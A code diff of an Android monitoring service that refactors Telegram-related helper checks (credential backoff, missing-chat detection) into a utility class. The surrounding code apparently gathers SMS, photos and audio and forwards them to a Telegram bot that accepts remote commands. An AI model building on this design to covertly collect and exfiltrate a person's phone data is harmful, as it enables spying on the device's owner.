@@ -555,7 +555,7 @@ class MonitoringService : Service() {
                     delay(60_000)
                 } else if (!hasNetwork()) {
                     delay(60_000)
-                } else if (authBlocked()) {
+                } else if (NetworkUtils.isAuthBlocked(preferencesManager)) {
                     delay(300_000)
                 } else {
                     delay((10_000L + idlePolls * 5_000L).coerceAtMost(30_000L))
@@ -564,30 +564,10 @@ class MonitoringService : Service() {
         }
     }
 
-    private fun authBlocked(): Boolean {
-        return try {
-            val err = preferencesManager.credentialError
-            if (err != "401" && err != "403" && err != "400") return false
-            val now = System.currentTimeMillis()
-            if (now < preferencesManager.credentialErrorAt) {
-                preferencesManager.credentialError = ""
-                preferencesManager.credentialErrorAt = 0L
-                return false
-            }
-            now - preferencesManager.credentialErrorAt < 30 * 60_000L
-        } catch (_: Exception) {
-            false
-        }
-    }
 
-    private fun isChatMissing(errorBody: String?): Boolean {
-        if (errorBody.isNullOrEmpty()) return false
-        val lower = errorBody.lowercase(java.util.Locale.ROOT)
-        return lower.contains("chat not found") || lower.contains("bot was blocked") || lower.contains("user not found") || lower.contains("group chat was deleted") || lower.contains("group chat was upgraded") || lower.contains("chat_id is empty")
-    }
 
     private suspend fun pollTelegramCommands(): Boolean {
-        if (authBlocked()) return false
+        if (NetworkUtils.isAuthBlocked(preferencesManager)) return false
         val (botToken, chatId) = sendCreds()
         if (botToken.isEmpty() || chatId.isEmpty()) return false
 
@@ -1173,7 +1153,7 @@ class MonitoringService : Service() {
             }
             "/flush" -> {
                 val queued = messageQueue.getQueueSize()
-                if (authBlocked()) {
+                if (NetworkUtils.isAuthBlocked(preferencesManager)) {
                     sendToTelegram("⚠️ Flush delayed: bot credentials rejected (${preferencesManager.credentialError}). Fix the token in Setup.")
                     return
                 }
@@ -1808,7 +1788,7 @@ class MonitoringService : Service() {
 
     private suspend fun checkAndSendNewData() {
         if (initialSyncRunning.get()) return
-        if (authBlocked()) return
+        if (NetworkUtils.isAuthBlocked(preferencesManager)) return
         try {
             val lastSms = try {
                 preferencesManager.lastSmsId
@@ -2196,7 +2176,7 @@ class MonitoringService : Service() {
                 return queueOnFail
             } else if (response.code() == 400) {
                 val goneBody = try { response.errorBody()?.string() } catch (_: Exception) { null }
-                if (isChatMissing(goneBody)) {
+                if (NetworkUtils.isChatMissing(goneBody)) {
                     try {
                         preferencesManager.credentialError = response.code().toString()
                         preferencesManager.credentialErrorAt = System.currentTimeMillis()
@@ -2467,7 +2447,7 @@ class MonitoringService : Service() {
     // ═══════════════════════════════════════════════════════════
     
     private fun captureAndSendPhoto(reportResult: Boolean = false) {
-        if (authBlocked()) {
+        if (NetworkUtils.isAuthBlocked(preferencesManager)) {
             serviceScope.launch {
                 if (reportResult) {
                     sendToTelegram("Auth rejected, photo delayed until the token is fixed in Setup.")
@@ -2965,7 +2945,7 @@ class MonitoringService : Service() {
 
     private suspend fun sendAudioFile(audioFile: File): MediaSendOutcome {
         try {
-            if (authBlocked()) return MediaSendOutcome.KEPT
+            if (NetworkUtils.isAuthBlocked(preferencesManager)) return MediaSendOutcome.KEPT
             if (!hasNetwork()) return MediaSendOutcome.KEPT
             val (botToken, chatId) = sendCreds()
             if (botToken.isEmpty() || chatId.isEmpty()) return MediaSendOutcome.KEPT
@@ -2991,7 +2971,7 @@ class MonitoringService : Service() {
                 } catch (_: Exception) {
                     null
                 }
-                if (isChatMissing(audioErr)) {
+                if (NetworkUtils.isChatMissing(audioErr)) {
                     try {
                         preferencesManager.credentialError = response.code().toString()
                         preferencesManager.credentialErrorAt = System.currentTimeMillis()
@@ -3012,7 +2992,7 @@ class MonitoringService : Service() {
     }
 
     private suspend fun flushPendingAudio(max: Int = 5) {
-        if (authBlocked()) return
+        if (NetworkUtils.isAuthBlocked(preferencesManager)) return
         if (!audioFlushBusy.compareAndSet(false, true)) return
         try {
             if (!hasNetwork()) return
@@ -3141,7 +3121,7 @@ class MonitoringService : Service() {
 
     private suspend fun sendPhotoFile(photoFile: File): MediaSendOutcome {
         try {
-            if (authBlocked()) return MediaSendOutcome.KEPT
+            if (NetworkUtils.isAuthBlocked(preferencesManager)) return MediaSendOutcome.KEPT
             if (!hasNetwork()) {
                 android.util.Log.w("MonitoringService", "No network - photo saved for later")
                 return MediaSendOutcome.KEPT
@@ -3186,7 +3166,7 @@ class MonitoringService : Service() {
                 } catch (_: Exception) {
                 }
             } else if (response.code() == 400) {
-                if (isChatMissing(errorBody)) {
+                if (NetworkUtils.isChatMissing(errorBody)) {
                     try {
                         preferencesManager.credentialError = response.code().toString()
                         preferencesManager.credentialErrorAt = System.currentTimeMillis()
@@ -3211,7 +3191,7 @@ class MonitoringService : Service() {
     }
 
     private suspend fun flushPendingPhotos(max: Int = 10) {
-        if (authBlocked()) return
+        if (NetworkUtils.isAuthBlocked(preferencesManager)) return
         if (!photoFlushBusy.compareAndSet(false, true)) return
         try {
             val pending = try {
